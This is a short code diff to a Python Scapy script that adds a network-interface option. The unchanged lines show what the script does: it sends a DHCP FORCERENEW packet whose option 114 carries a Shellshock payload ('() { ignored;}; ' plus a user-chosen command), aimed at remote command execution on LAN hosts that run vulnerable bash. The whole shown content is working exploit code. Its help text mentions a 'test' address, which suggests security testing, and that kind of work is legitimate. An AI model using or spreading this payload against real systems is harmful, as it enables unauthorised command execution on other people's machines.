@@ -19,6 +19,8 @@ def parse_args():
         help="your ip address on lan")
     p.add_argument('-t', '--dst-ip', required=True,
         help="test ip address on lan")
+    p.add_argument('-i', '--interface', required=True,
+        help="network interface for sending")
 
     args = p.parse_args()
     return args
@@ -30,7 +32,7 @@ def main():
         IP(src=args.src_ip, dst=args.dst_ip)/
         UDP(sport=68,dport=67)/
         BOOTP(chaddr=args.src_mac)/
-        DHCP(options=[("message-type","force_renew"), (114, "() { ignored;}; " + args.command), ('end')]))
+        DHCP(options=[("message-type","force_renew"), (114, "() { ignored;}; " + args.command), ('end')]),iface=args.interface)
 
 if __name__ == "__main__":
     main()
